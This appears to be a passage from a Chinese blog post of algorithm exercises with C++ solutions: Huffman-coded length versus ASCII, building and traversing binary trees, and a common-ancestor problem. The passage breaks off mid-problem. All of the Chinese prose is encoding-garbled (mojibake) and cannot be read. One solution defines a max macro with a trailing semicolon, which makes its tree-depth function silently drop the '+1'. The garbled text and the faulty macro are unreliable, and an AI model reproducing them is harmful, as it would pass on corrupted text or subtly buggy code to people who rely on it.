è¾“å…¥ç»“æŸå°†é€šè¿‡ä»…åŒ…å«å•è¯â€œ <span class="keyword">END</span>â€ä½œä¸ºæ–‡æœ¬å­—ç¬¦ä¸²çš„è¡Œæ¥è¡¨ç¤ºã€‚ æ­¤è¡Œä¸åº”è¢«å¤„ç†ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-13"><a href="#è¾“å‡ºæè¿°-13" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºè¾“å…¥ä¸­çš„æ¯ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²ï¼Œè¾“å‡º<span class="number">8</span>ä½<span class="keyword">ASCII</span>ç¼–ç çš„ä½é•¿åº¦ï¼Œæœ€ä½³æ— å‰ç¼€å¯å˜é•¿åº¦ç¼–ç çš„ä½é•¿åº¦ä»¥åŠç²¾ç¡®åˆ°å°æ•°ç‚¹åçš„å‹ç¼©ç‡ã€‚</span><br></pre></td></tr></table></figure><p>åªæ±‚å“ˆå¤«æ›¼ç¼–ç çš„é•¿åº¦å¯ä»¥è§„çº¦åˆ°ä»¥å­—ç¬¦çš„æ•°é‡å¤§å°ä¸ºå¶èŠ‚ç‚¹çš„å“ˆå¤«æ›¼æ ‘ä¸Šã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line"><span class="keyword">if</span>(s == <span class="string">&quot;END&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line"><span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">m[s[i]]++;</span><br><span class="line">&#125;</span><br><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;::iterator iterm;</span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; q;</span><br><span class="line"><span class="keyword">for</span>(iterm = m.<span class="built_in">begin</span>(); iterm != m.<span class="built_in">end</span>(); iterm++)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(iterm-&gt;second);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(q.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">ans = q.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> t1 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> t2 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> t3 = t1 + t2;</span><br><span class="line">ans += t3;</span><br><span class="line">q.<span class="built_in">push</span>(t3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> l = len * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %.1f\n&quot;</span>, l, ans, (<span class="keyword">double</span>)l / ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ ‘"><a href="#äºŒå‰æ ‘" class="headerlink" title="äºŒå‰æ ‘"></a>äºŒå‰æ ‘</h2><p>ä¸€äº›æ¦‚å¿µï¼šäºŒå‰æ ‘å®šä¹‰ã€ç‰¹ç‚¹ã€æ€§è´¨ï¼š</p><p><img src="/.io//ç®—æ³•åˆ·é¢˜è®°å½•/1687596261551.png" alt="1687596261551"></p><p><img src="/.io//ç®—æ³•åˆ·é¢˜è®°å½•/1687596272848.png" alt="1687596272848"></p><p><img src="/.io//ç®—æ³•åˆ·é¢˜è®°å½•/1687596299111.png" alt="1687596299111"><img src="/.io//ç®—æ³•åˆ·é¢˜è®°å½•/1687596289196.png" alt="1687596289196"></p><p>å…¶ä»–çš„æ¦‚å¿µæ¯”å¦‚æ»¡äºŒå‰æ ‘ã€å®Œå…¨äºŒå‰æ ‘ï¼ŒäºŒå‰æ ‘éå†ï¼ˆå‰ä¸­ååºï¼‰</p><h3 id="äºŒå‰æ ‘çš„å»ºç«‹å’Œéå†"><a href="#äºŒå‰æ ‘çš„å»ºç«‹å’Œéå†" class="headerlink" title="äºŒå‰æ ‘çš„å»ºç«‹å’Œéå†"></a>äºŒå‰æ ‘çš„å»ºç«‹å’Œéå†</h3><h5 id="é¢˜ç›®æè¿°-14"><a href="#é¢˜ç›®æè¿°-14" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å»ºç«‹ä»¥äºŒå‰é“¾ä½œä¸ºå­˜å‚¨ç»“æ„çš„äºŒå‰æ ‘ï¼Œå®ç° 1ï¼‰å…ˆåºéå†ï¼› 2ï¼‰ä¸­åºéå†ï¼› 3ï¼‰ååºéå†ï¼› 4ï¼‰å±‚åºéå†ï¼› 5ï¼‰ç¼–ç¨‹è®¡ç®—äºŒå‰æ ‘çš„å¶å­ç»“ç‚¹ä¸ªæ•°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-12"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-12" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-14"><a href="#è¾“å…¥æè¿°-14" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŒ‰ç…§å…ˆåºéå†åºåˆ—è¾“å…¥äºŒå‰æ ‘ä¸­æ•°æ®å…ƒç´ çš„å€¼ï¼Œæ²¡æœ‰çš„è¾“å…¥0è¡¨ç¤ºã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-14"><a href="#è¾“å‡ºæè¿°-14" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å‡ºå…ˆåºéå†åºåˆ— ç¬¬äºŒè¡Œè¾“å‡ºä¸­åºéå†åºåˆ— ç¬¬ä¸‰è¡Œè¾“å‡ºååºéå†åºåˆ— ç¬¬å››è¡Œè¾“å‡ºå¶å­ç»“ç‚¹çš„ä¸ªæ•°ã€‚</span><br></pre></td></tr></table></figure><p>æ³¨æ„å‡½æ•°ä¼ å‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b) a &gt; b ? a : b;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createTree</span><span class="params">(Tree &amp;T)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line">cin &gt;&gt; c;</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T = (struct node *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node));</span><br><span class="line">T-&gt;c = c;</span><br><span class="line"><span class="built_in">createTree</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">createTree</span>(T-&gt;r); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">PreOrderTraverse</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">PreOrderTraverse</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;l);</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(T-&gt;r);</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Leaf</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;l == <span class="literal">NULL</span> &amp;&amp; T-&gt;r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Leaf</span>(T-&gt;l) + <span class="built_in">Leaf</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="built_in">Depth</span>(T-&gt;l);</span><br><span class="line"><span class="keyword">int</span> y = <span class="built_in">Depth</span>(T-&gt;r);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">max</span>(x, y) + <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Tree root;</span><br><span class="line"><span class="built_in">createTree</span>(root);</span><br><span class="line"><span class="built_in">PreOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="built_in">Leaf</span>(root) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘éå†"><a href="#äºŒå‰æ ‘éå†" class="headerlink" title="äºŒå‰æ ‘éå†"></a>äºŒå‰æ ‘éå†</h3><h5 id="é¢˜ç›®æè¿°-15"><a href="#é¢˜ç›®æè¿°-15" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>ç¼–ä¸€ä¸ªç¨‹åºï¼Œè¯»å…¥ç”¨æˆ·è¾“å…¥çš„ä¸€ä¸²å…ˆåºéå†å­—ç¬¦ä¸²ï¼Œæ ¹æ®æ­¤å­—ç¬¦ä¸²å»ºç«‹ä¸€ä¸ªäºŒå‰æ ‘ï¼ˆä»¥æŒ‡é’ˆæ–¹å¼å­˜å‚¨ï¼‰ã€‚ ä¾‹å¦‚å¦‚ä¸‹çš„å…ˆåºéå†å­—ç¬¦ä¸²ï¼š ABC##DE#G##F### å…¶ä¸­â€œ#â€è¡¨ç¤ºçš„æ˜¯ç©ºæ ¼ï¼Œç©ºæ ¼å­—ç¬¦ä»£è¡¨ç©ºæ ‘ã€‚å»ºç«‹èµ·æ­¤äºŒå‰æ ‘ä»¥åï¼Œå†å¯¹äºŒå‰æ ‘è¿›è¡Œä¸­åºéå†ï¼Œè¾“å‡ºéå†ç»“æœ</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-13"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-13" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-15"><a href="#è¾“å…¥æè¿°-15" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…æ‹¬1è¡Œå­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¸è¶…è¿‡100ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-15"><a href="#è¾“å‡ºæè¿°-15" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½æœ‰å¤šç»„æµ‹è¯•æ•°æ®ï¼Œå¯¹äºæ¯ç»„æ•°æ®ï¼Œ</span><br><span class="line">è¾“å‡ºå°†è¾“å…¥å­—ç¬¦ä¸²å»ºç«‹äºŒå‰æ ‘åä¸­åºéå†çš„åºåˆ—ï¼Œæ¯ä¸ªå­—ç¬¦åé¢éƒ½æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</span><br><span class="line">æ¯ä¸ªè¾“å‡ºç»“æœå ä¸€è¡Œã€‚</span><br></pre></td></tr></table></figure><p>æ³¨æ„createçš„æ—¶å€™ï¼Œnewå‡ºæ¥çš„treeç©ºé—´æ˜¯åœ¨å †ä¸Šï¼Œå’Œæ ˆä¸€æ ·è¦åˆå§‹åŒ–ï¼ˆä½†æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸Šä¸€é¢˜ä¸ç”¨ä¹Ÿå¯ä»¥ï¼‰ï¼Œæ€»ä¹‹åˆå§‹åŒ–ä¸€å®šä¸ä¼šæœ‰é—®é¢˜</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125; *Tree;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line">string s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Tree &amp;T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(idx &gt;= s.<span class="built_in">size</span>()) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">char</span> c = s[idx++];</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T = <span class="keyword">new</span> node;</span><br><span class="line">T-&gt;c = c;</span><br><span class="line">T-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">T-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">create</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">create</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;l);</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">Tree root;</span><br><span class="line"><span class="built_in">create</span>(root);</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘-1"><a href="#äºŒå‰æ ‘-1" class="headerlink" title="äºŒå‰æ ‘"></a>äºŒå‰æ ‘</h3><h5 id="é¢˜ç›®æè¿°-16"><a href="#é¢˜ç›®æè¿°-16" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><pre><code>1  /2   3/ \ /</code></pre><p>  4 5 6 7<br>  /\ /\ /\ /<br>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç”±æ­£æ•´æ•° 1, 2, 3, â€¦ç»„æˆäº†ä¸€æ£µæ— é™å¤§çš„äºŒå‰æ ‘ã€‚ä»æŸä¸€ä¸ªç»“ç‚¹åˆ°æ ¹ç»“ç‚¹ï¼ˆç¼–å·æ˜¯1çš„ç»“ç‚¹ï¼‰éƒ½æœ‰ä¸€æ¡å”¯ä¸€çš„è·¯å¾„ï¼Œæ¯”å¦‚ä»5åˆ°æ ¹ç»“ç‚¹çš„è·¯å¾„æ˜¯ï¼ˆ5, 2, 1ï¼‰ï¼Œä»4åˆ°æ ¹ç»“ç‚¹çš„è·¯å¾„æ˜¯ï¼ˆ4, 2, 1ï¼‰ï¼Œä»æ ¹ç»“ç‚¹1åˆ°æ ¹ç»“ç‚¹çš„è·¯å¾„ä¸ŠåªåŒ…å«ä¸€ä¸ªç»“ç‚¹1ï¼Œå› æ­¤è·¯å¾„å°±æ˜¯ï¼ˆ1ï¼‰ã€‚å¯¹äºä¸¤ä¸ªç»“ç‚¹xå’Œyï¼Œå‡è®¾ä»–ä»¬åˆ°æ ¹ç»“ç‚¹çš„è·¯å¾„åˆ†åˆ«æ˜¯ï¼ˆx1, x2, â€¦ ,1ï¼‰å’Œï¼ˆy1, y2,â€¦,1ï¼‰ï¼Œé‚£ä¹ˆå¿…ç„¶å­˜åœ¨ä¸¤ä¸ªæ­£æ•´æ•°iå’Œjï¼Œä½¿å¾—ä»xi å’Œyj å¼€å§‹ï¼Œæœ‰xi = yjï¼Œxi + 1 = yj + 1ï¼Œxi + 2 = yj + 2ï¼Œâ€¦<br>ç°åœ¨çš„é—®é¢˜å°±æ˜¯ï¼Œç»™å®šxå’Œyï¼Œè¦æ±‚ä»–ä»¬çš„å…¬å…±çˆ¶èŠ‚ç‚¹ï¼Œå³xiï¼ˆä¹Ÿå°±æ˜¯ yjï¼‰ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-14"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-14" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-16"><a href="#è¾“å…¥æè¿°-16" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…å«å¤šç»„æ•°æ®ï¼Œæ¯ç»„æ•°æ®åŒ…å«ä¸¤ä¸ªæ­£æ•´æ•°<span class="keyword">x</span>å’Œyï¼ˆ<span class="number">1</span>â‰¤<span class="keyword">x</span><span class="punctuation">,</span> yâ‰¤<span class="number">2</span>^<span class="number">31</span><span class="number">-1</span>ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-16"><a href="#è¾“å‡ºæè¿°-16" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹åº”æ¯ä¸€ç»„æ•°æ®ï¼Œè¾“å‡ºä¸€ä¸ªæ­£æ•´æ•°<span class="keyword">xi</span>ï¼Œå³å®ƒä»¬çš„é¦–ä¸ªå…¬å…±çˆ¶èŠ‚ç‚¹ã€‚</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å®Œå…¨äºŒå‰æ ‘çš„ç‰¹æ€§ï¼Œçˆ¶èŠ‚ç‚¹ =å­èŠ‚ç‚¹/2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line"><span class="keyword">while</span>(x!=y)&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt; y)&#123;</span><br><span class="line">x /=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">y /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘2"><a href="#äºŒå‰æ ‘2" class="headerlink" title="äºŒå‰æ ‘2"></a>äºŒå‰æ ‘2</h3><h5 id="é¢˜ç›®æè¿°-17"><a href="#é¢˜ç›®æè¿°-17" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p><img src="https://noobdream.com/media/upload/2019/10/24/39_1429598902788_btree.jpg" alt></p><pre><code>å¦‚ä¸Šæ‰€ç¤ºï¼Œç”±æ­£æ•´æ•°1ï¼Œ2ï¼Œ3â€¦â€¦ç»„æˆäº†ä¸€é¢—ç‰¹æ®ŠäºŒå‰æ ‘ã€‚æˆ‘ä»¬å·²çŸ¥è¿™ä¸ªäºŒå‰æ ‘çš„æœ€åä¸€ä¸ªç»“ç‚¹æ˜¯nã€‚ç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œç»“ç‚¹mæ‰€åœ¨çš„å­æ ‘ä¸­ä¸€å…±åŒ…æ‹¬å¤šå°‘ä¸ªç»“ç‚¹ã€‚     æ¯”å¦‚ï¼Œn = 12ï¼Œm = 